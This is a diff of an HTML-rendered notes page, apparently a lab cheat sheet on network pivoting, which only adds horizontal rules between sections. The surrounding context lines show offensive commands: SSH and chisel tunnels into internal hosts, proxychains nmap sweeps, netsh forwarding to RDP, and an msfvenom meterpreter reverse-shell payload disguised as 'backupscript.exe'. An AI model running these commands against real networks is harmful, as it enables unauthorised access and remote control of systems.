@@ -73,6 +73,8 @@
 <span class="nv">$ </span>ssh <span class="nt">-L</span> 1234:localhost:3306 <span class="nt">-L</span> 8080:localhost:80 ubuntu@10.129.202.64
 </code></pre></div></div>
 
+<hr />
+
 <h1 id="dynamic-port-forwarding">Dynamic Port Forwarding</h1>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-D</span> 9050 ubuntu@10.129.202.64
 </code></pre></div></div>
@@ -86,6 +88,8 @@ socks4 	127.0.0.1 9050
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>proxychains nmap <span class="nt">-v</span> <span class="nt">-sn</span> 172.16.5.1-200
 </code></pre></div></div>
+
+<hr />
 
 <h1 id="remotereverse-port-forwarding-with-ssh">Remote/Reverse Port Forwarding with SSH</h1>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_https <span class="nv">lhost</span><span class="o">=</span> &lt;InternalIPofPivotHost&gt; <span class="nt">-f</span> exe <span class="nt">-o</span> backupscript.exe <span class="nv">LPORT</span><span class="o">=</span>8080
@@ -114,6 +118,8 @@ msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-R</span> &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; <span class="nt">-vN</span>
 </code></pre></div></div>
 
+<hr />
+
 <h1 id="socat-redirection"><a href="https://linux.die.net/man/1/socat">Socat</a> Redirection</h1>
 <h2 id="reverse-shell">Reverse Shell</h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># On pivot machine</span>
@@ -132,9 +138,13 @@ msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span 
   <li>Set LHOST = 0.0.0.0 on msfconsole</li>
 </ul>
 
+<hr />
+
 <h1 id="port-forwarding-with-windows-netsh">Port Forwarding with Windows Netsh</h1>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt; netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
 </code></pre></div></div>
+
+<hr />
 
 <h1 id="socks5-tunneling-with-chisel">SOCKS5 Tunneling with Chisel</h1>
 <p><code class="language-plaintext highlighter-rouge">Find PID to kill</code></p>
@@ -147,6 +157,8 @@ msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span 
 <span class="c"># Remote machine</span>
 ./chisel client <span class="nt">--fingerprint</span> <span class="nv">f9KLbYov18MaH86fvgZhbVMyTAj4LAT6Iv8E8Nlwy0k</span><span class="o">=</span> 10.10.15.23:8080 R:8081:127.0.0.1:445
 </code></pre></div></div>
+
+<hr />
 
 <h1 id="ligolo-ng"><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a></h1>
 
